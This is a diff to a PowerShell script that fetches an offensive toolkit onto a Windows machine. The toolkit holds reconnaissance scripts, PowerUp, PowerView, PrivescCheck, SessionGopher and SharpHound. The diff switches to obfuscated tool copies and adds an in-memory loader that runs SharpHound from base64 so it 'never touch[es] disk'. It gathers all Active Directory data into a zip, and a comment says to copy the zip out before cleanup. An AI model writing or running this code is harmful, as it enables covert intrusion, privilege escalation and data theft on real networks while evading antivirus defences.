@@ -19,10 +19,10 @@ $files = @(
     'bat/06-av-check.bat', 'bat/07-schtasks.bat', 'bat/99-run-all.bat',
     'wsh/enum-system.vbs', 'wsh/enum-network.js', 'wsh/run-all.wsf',
     'ps1/Get-LocalRecon.ps1', 'ps1/Load-Assembly.ps1', 'ps1/Invoke-Suite.ps1',
-    'ps1/Get-Kit.ps1',
-    'tools/PowerUp.ps1', 'tools/PowerView.ps1', 'tools/jaws-enum.ps1',
-    'tools/SessionGopher.ps1', 'tools/PrivescCheck.ps1',
-    'tools/sharphound/SharpHound.ps1'
+    'ps1/Get-Kit.ps1', 'ps1/InMem-Asm.ps1',
+    'tools-obf/PowerUp.ps1', 'tools-obf/PowerView.ps1', 'tools-obf/jaws-enum.ps1',
+    'tools-obf/SessionGopher.ps1', 'tools-obf/PrivescCheck.ps1',
+    'tools-obf/SharpHound.exe.b64'
 )
 
 $wc = New-Object Net.WebClient
@@ -39,10 +39,11 @@ foreach ($f in $files) {
 }
 Write-Host "[+] kit -> $OutDir"
 
-# In-memory SharpHound: dot-source the embedded-assembly wrapper, run, never touch disk
+# In-memory SharpHound: decode b64 text -> assembly in RAM, never touch disk
 function Invoke-BloodHoundFromRepo {
     param([string]$Domain = $env:USERDNSDOMAIN, [string]$ZipOut = (Join-Path $env:TEMP 'bh.zip'))
-    . (Join-Path $OutDir 'tools\sharphound\SharpHound.ps1')
-    Invoke-BloodHound -CollectionMethod All -Domain $Domain -ZipFileName $ZipOut
+    . (Join-Path $OutDir 'ps1\InMem-Asm.ps1')
+    Invoke-AsmFromB64 -B64Path (Join-Path $OutDir 'tools-obf\SharpHound.exe.b64') `
+        -AsmArgs @('-c','All','-d',$Domain,'--outputdirectory',$env:TEMP,'--zipfilename',(Split-Path $ZipOut -Leaf))
     Write-Host "[+] bloodhound zip -> $ZipOut (copy out via hotspot/upload before cleanup)"
 }
